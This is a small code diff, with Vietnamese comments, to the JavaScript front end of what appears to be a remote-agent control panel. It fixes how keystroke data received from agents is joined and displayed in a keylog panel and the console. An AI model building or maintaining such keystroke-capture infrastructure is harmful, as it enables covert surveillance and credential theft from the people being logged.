@@ -324,12 +324,24 @@ const gateway = new Gateway({
         }
     },
     onKeylog: (keyData, agentId) => {
+        // SỬA: Xử lý hiển thị thô cho global log (tránh crash khi nhận Array)
+        let displayString = "";
+        
+        if (Array.isArray(keyData)) {
+            // Nếu là mảng, nối lại thành chuỗi để hiển thị log đơn giản
+            displayString = keyData.join(""); 
+        } else {
+            displayString = String(keyData);
+        }
+
         const keylogPanel = document.getElementById('keylog-panel');
         if (keylogPanel) {
-            keylogPanel.value += keyData;
+            keylogPanel.value += displayString;
             keylogPanel.scrollTop = keylogPanel.scrollHeight;
         }
-        console.log(`%c[Keylog - ${agentId}]: ${keyData.replace(/\n/g, '\\n')}`, 'color: orange');
+        
+        // SỬA: Đảm bảo không gọi .replace trên Array
+        console.log(`%c[Keylog - ${agentId}]: ${displayString.replace(/\n/g, '\\n')}`, 'color: orange');
     },
     onMessage: (msg) => {
         console.log("Raw Msg: ", msg);
